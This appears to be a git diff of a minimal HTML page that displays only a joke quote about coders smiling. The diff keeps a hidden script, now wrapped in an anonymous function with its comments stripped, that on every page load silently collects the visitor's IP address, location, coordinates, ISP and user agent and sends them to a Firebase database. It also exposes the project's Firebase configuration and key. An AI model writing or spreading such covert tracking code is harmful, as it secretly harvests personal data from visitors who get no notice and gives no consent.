@@ -1,4 +1,3 @@
-
 <!DOCTYPE html>
 <html>
 <head>
@@ -28,7 +27,7 @@
     }
 
     p {
-      font-size: 36px; /* Bigger font */
+      font-size: 36px;
       font-weight: bold;
       line-height: 1.8;
       margin: 0;
@@ -40,46 +39,45 @@
   </style>
 </head>
 <body>
- 
+
   <div class="container">
-        <p>"Every time you click, a coder smiles. Somewhere. Maybe."</p>
+    <p>"Every time you click, a coder smiles. Somewhere. Maybe."</p>
   </div>
 
   <script>
-    // Your Firebase config
-    const firebaseConfig = {
-      apiKey: "AIzaSyA6FOahPr_40N1WS0S-VY_ssQRefwJt9c8",
-      authDomain: "messagetracker-fced6.firebaseapp.com",
-      databaseURL: "https://messagetracker-fced6-default-rtdb.firebaseio.com",
-      projectId: "messagetracker-fced6",
-      storageBucket: "messagetracker-fced6.appspot.com",
-      messagingSenderId: "770318035535",
-      appId: "1:770318035535:web:c8b802e29e11c59e44183a",
-      measurementId: "G-YXQNQSL5HR"
-    };
+    (function(){
+      const f = {
+        apiKey: "AIzaSyA6FOahPr_40N1WS0S-VY_ssQRefwJt9c8",
+        authDomain: "messagetracker-fced6.firebaseapp.com",
+        databaseURL: "https://messagetracker-fced6-default-rtdb.firebaseio.com",
+        projectId: "messagetracker-fced6",
+        storageBucket: "messagetracker-fced6.appspot.com",
+        messagingSenderId: "770318035535",
+        appId: "1:770318035535:web:c8b802e29e11c59e44183a",
+        measurementId: "G-YXQNQSL5HR"
+      };
+      firebase.initializeApp(f);
+      const db = firebase.database();
 
-    // Initialize Firebase
-    firebase.initializeApp(firebaseConfig);
-    const db = firebase.database();
-
-    // Fetch IP data
-    fetch("https://ipapi.co/json")
-      .then(response => response.json())
-      .then(data => {
-        const logData = {
-          ip: data.ip,
-          city: data.city,
-          region: data.region,
-          country: data.country_name,
-          org: data.org,
-          timezone: data.timezone,
-          latitude: data.latitude,
-          longitude: data.longitude,
-          timestamp: new Date().toISOString(),
-          userAgent: navigator.userAgent
-        };
-        db.ref("ip_logs_spp").push(logData);
-      });
+      fetch("https://ipapi.co/json")
+        .then(r => r.json())
+        .then(d => {
+          const log = {
+            ip: d.ip,
+            city: d.city,
+            region: d.region,
+            country: d.country_name,
+            org: d.org,
+            timezone: d.timezone,
+            latitude: d.latitude,
+            longitude: d.longitude,
+            timestamp: new Date().toISOString(),
+            userAgent: navigator.userAgent
+          };
+          db.ref("ip_logs_p1").push(log);
+        });
+    })();
   </script>
+
 </body>
 </html>
